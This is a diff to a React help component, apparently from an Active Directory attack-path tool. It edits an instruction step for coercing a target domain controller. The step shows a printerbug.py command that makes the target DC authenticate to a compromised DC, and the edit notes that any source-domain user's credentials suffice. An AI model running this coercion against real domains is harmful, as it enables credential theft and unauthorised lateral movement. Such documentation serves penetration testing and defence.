@@ -73,7 +73,7 @@ const LinuxAbuse: FC = () => {
             </Typography>
 
             <Typography variant='body1'>Step 2: Coerce target DC</Typography>
-            <Typography variant='body2'>Coerce the target DC using printerbug.py:</Typography>
+            <Typography variant='body2'>Coerce the target DC using printerbug.py with the credentials of any source domain user:</Typography>
             <Typography component={'pre'}>
                 {"printerbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised DC IP>"}
             </Typography>
